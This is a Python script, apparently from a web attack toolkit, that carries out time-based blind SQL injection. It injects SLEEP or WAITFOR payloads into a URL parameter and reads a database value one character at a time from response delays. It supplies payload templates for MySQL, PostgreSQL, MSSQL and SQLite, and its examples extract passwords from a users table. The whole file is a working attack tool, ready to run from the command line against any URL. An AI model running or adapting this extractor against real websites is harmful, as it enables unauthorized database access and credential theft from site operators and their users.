# -*- coding: utf-8 -*-
"""Time-based blind SQL injection (advanced) — zero deps."""

from __future__ import annotations
import sys
import time
import string

# Try requests; fall back to urllib
try:
    import requests as _requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

DEFAULT_CHARSET = string.ascii_lowercase + string.digits + "_{}-"


def time_blind(
    url_template: str,
    payload_template: str,
    charset: str = DEFAULT_CHARSET,
    delay: float = 2.0,
    max_len: int = 64,
    verbose: bool = True,
) -> str:
    """Generic time-based blind SQL injection extractor.

    Args:
        url_template: URL with {PAYLOAD} placeholder, e.g. "http://site/?id=1{PAYLOAD}"
        payload_template: SQL payload with {POS} and {CHAR} placeholders.
            Example: "' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),{POS},1)='{CHAR}',SLEEP({DELAY}),0)-- "
        charset: Characters to try
        delay: Sleep duration in seconds
        max_len: Maximum result length
    """
    result = []
    payload_template = (payload_template
                        .replace("{DELAY}", str(delay))
                        .replace("{POS}", "{}")
                        .replace("{CHAR}", "{}"))

    for pos in range(1, max_len + 1):
        found = False
        for ch in charset:
            payload = payload_template.format(pos, ch)
            url = url_template.replace("{PAYLOAD}", payload)
            elapsed = _time_request(url, delay + 3)

            if elapsed >= delay:
                result.append(ch)
                if verbose:
                    print(f"  pos {pos}: {ch} ({elapsed:.1f}s)", flush=True)
                found = True
                break

            if verbose:
                sys.stdout.write(f"\r  pos {pos}: trying '{ch}'...   ")
                sys.stdout.flush()

        if not found:
            if verbose:
                print(f"\n  [done] extracted: {''.join(result)}")
            break

    return "".join(result)


def _time_request(url: str, timeout: float) -> float:
    t0 = time.time()
    try:
        if HAS_REQUESTS:
            _requests.get(url, timeout=timeout, headers={
                "User-Agent": "Yang-Web/2.0 TimeBlind"
            })
        else:
            import urllib.request
            req = urllib.request.Request(url, headers={"User-Agent": "Yang-Web/2.0"})
            urllib.request.urlopen(req, timeout=int(timeout))
    except Exception:
        pass
    return time.time() - t0


def format_payloads(url: str, param: str = "id") -> list:
    """Generate common time-blind payload templates."""
    base_url = url.replace("{PAYLOAD}", "{PAYLOAD}") if "{PAYLOAD}" in url else f"{url}?{param}={{PAYLOAD}}"
    return [
        {
            "db": "MySQL/MariaDB",
            "url": base_url,
            "payload": "' AND IF(SUBSTRING(({QUERY}),{POS},1)='{CHAR}',SLEEP({DELAY}),0)-- ",
            "note": "Replace {QUERY} with your SELECT statement",
        },
        {
            "db": "PostgreSQL",
            "url": base_url,
            "payload": "' OR (SELECT CASE WHEN SUBSTRING(({QUERY}),{POS},1)='{CHAR}' THEN pg_sleep({DELAY}) END)--",
        },
        {
            "db": "MSSQL",
            "url": base_url,
            "payload": "'; IF SUBSTRING(({QUERY}),{POS},1)='{CHAR}' WAITFOR DELAY '00:00:0{DELAY}'--",
        },
        {
            "db": "SQLite",
            "url": base_url,
            "payload": "'; SELECT CASE WHEN SUBSTRING(({QUERY}),{POS},1)='{CHAR}' THEN randomblob(100000000*{DELAY}) END--",
        },
    ]


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python time_sqli.py <URL> <QUERY> [--param id] [--delay 2] [--maxlen 32]")
        print("Example: python time_sqli.py 'http://site/?id=1' 'SELECT password FROM users'")
        print()
        print("Available payload templates:")
        for tpl in format_payloads("http://example.com/?id=1", "id"):
            print(f"\n  [{tpl['db']}]")
            print(f"  URL: {tpl['url']}")
            print(f"  Payload: {tpl['payload']}")
        sys.exit(0)

    url = sys.argv[1]
    query = sys.argv[2]
    param = sys.argv[4] if len(sys.argv) > 4 and sys.argv[3] == "--param" else "id"
    delay_val = float(sys.argv[6]) if len(sys.argv) > 6 and sys.argv[5] == "--delay" else 2.0
    max_len = int(sys.argv[8]) if len(sys.argv) > 8 and sys.argv[7] == "--maxlen" else 32

    base = url if "{PAYLOAD}" in url else f"{url}?{param}={{PAYLOAD}}"
    payload_tpl = f"' AND IF(SUBSTRING(({query}),{{POS}},1)='{{CHAR}}',SLEEP({{DELAY}}),0)-- "

    print(f"Target: {base}")
    print(f"Query: {query}")
    print(f"Delay: {delay_val}s")
    print(f"Extracting...\n")

    result = time_blind(base, payload_tpl, delay=delay_val, max_len=max_len)
    print(f"\nResult: {result}")
